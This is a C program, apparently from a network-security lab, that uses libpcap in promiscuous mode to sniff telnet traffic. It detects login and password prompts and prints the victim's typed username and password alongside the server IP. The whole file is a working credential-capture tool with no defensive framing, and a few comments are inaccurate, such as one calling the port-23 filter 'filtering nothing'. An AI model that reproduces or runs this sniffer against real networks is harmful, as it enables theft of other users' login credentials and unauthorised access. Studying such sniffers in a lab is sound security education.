#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define EOL 0x0d // end of line character "\n\r"
#define NIC "wlp0s20f3"


int captureTelnet = 0; // to check if we need to start sniffing username/password
int etherhdlen = 14; // Doesn't change 
u_short  srcport, destport; // for the src and dest port of tcp packet

// structs we will need for this sniffing
struct sockaddr_in IPaddr;
struct ether_header *eth_header;
struct iphdr *ip_header;
struct tcphdr *tcp_header;


void telnet_from_server(u_short headerLen, const u_char *packetData, int tcphdrlen, int iphdrlen){
	
    u_char *telnet_head;

    // if header length is big enough to contain server login message
    if (headerLen > etherhdlen + iphdrlen + tcphdrlen + 1)
    {
        // start position of telnet data
        telnet_head = (u_char*) (packetData + etherhdlen + iphdrlen + tcphdrlen);

        // if not currently capturing username/password
        if (captureTelnet == 0){
			for (int i = 0; i < (headerLen - (etherhdlen + iphdrlen + tcphdrlen)); ++i){
				if ((strncmp((telnet_head + i), "L", 1) == 0) ||
					(strncmp((telnet_head + i), "l", 1) == 0)){
					// got the "L" or "l" in "login"
					// user input will be username letters after this point					                                    
					printf("\n--------------------TELNET credentials-------------------\n");
					// Getting the data IP's from the headr to a struct to print it
					memset(&IPaddr, 0, sizeof(IPaddr));
					IPaddr.sin_addr.s_addr = ip_header->saddr;
					printf("Server IP: %s \n\n",inet_ntoa(IPaddr.sin_addr));
					
					printf("Username Capture!\n");
					printf("	Username: ");
					captureTelnet = 1;
					return;
				}
            }
			if ((strncmp(telnet_head, "P", 1) == 0) ||
				 (strncmp(telnet_head, "p", 1) == 0)){
			// got the "P" or "p" in "password"
			// user input will be password letters after this point
			printf("Password Capture!\n");
			printf("	Password: ");
			captureTelnet = 1;
			}
		}
    }
}


void telnet_from_client(u_short packetLen, const u_char *packet, int tcphdrlen, int iphdrlen){

	u_char *telnet_header;

	// if true that server has sent login prompts
	if (captureTelnet == 1){
		// start position of telnet data
		telnet_header = (u_char*)(packet + etherhdlen + iphdrlen + tcphdrlen);

		// headerlen is exactly this for usernname/password packets from client
		if (packetLen == etherhdlen + iphdrlen + tcphdrlen + 1){
			// if not carriage return character
			if (*telnet_header != EOL){
			// print actual username/password letter in this packet
			printf("%c", *telnet_header);
			}
		}
		else if (packetLen == etherhdlen + iphdrlen + tcphdrlen + 2){
			// headerlen is exactly this for last packet containing carriage return
			if (*telnet_header == EOL){
			// got correct header length,
			// and got carriage return (0x0d), so
			// user is done inputting username/password
			printf("\n*** END Capture ***\n\n");
			captureTelnet = 0;
			}
		}
	}
}

/* This function will be invoked by pcap for each captured packet.
We can process each packet inside the function.
*/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){//the packet handler function
	eth_header = (struct ether_header *) packet; //bulidding ethernet header
	ip_header = (struct iphdr *)(packet + etherhdlen); //building IP header
	int iphdrlen = ip_header->ihl*4; // detecting ip header length
	tcp_header = (struct tcphdr *)(packet + etherhdlen + iphdrlen);
	int tcphdrlen = tcp_header->th_off * 4;
	srcport  = ntohs( tcp_header->th_sport);
    destport = ntohs( tcp_header->th_dport);
		// checking whether the packet came from the client or the server 
    	if (srcport == IPPORT_TELNET){
        	telnet_from_server(header->len, packet, tcphdrlen, iphdrlen);
    	}
    	if (destport == IPPORT_TELNET){
        	telnet_from_client(header->len, packet, tcphdrlen, iphdrlen);
    	}
}

int main()
	{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];// buffer for ERROR
	struct bpf_program fp;
	char filter_exp[] = "tcp port 23";// here we can filter what we want currently filtering nothing
	bpf_u_int32 net;
	// Step 1: Open live pcap session on containers interface
	//The value 1 of the third parameter turns on the promiscuous mode 
	handle = pcap_open_live(NIC, BUFSIZ, 1, 1000, errbuf); 
	
	// Step 2: Compile filter_exp into BPF psuedo-code
	pcap_compile(handle, &fp, filter_exp, 0, net);
	if (pcap_setfilter(handle, &fp) !=0) {
		pcap_perror(handle, "Error:");
		exit(EXIT_FAILURE);
	}
	
	// Step 3: Capture packets
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle); //Close the handle
	return 0;
}
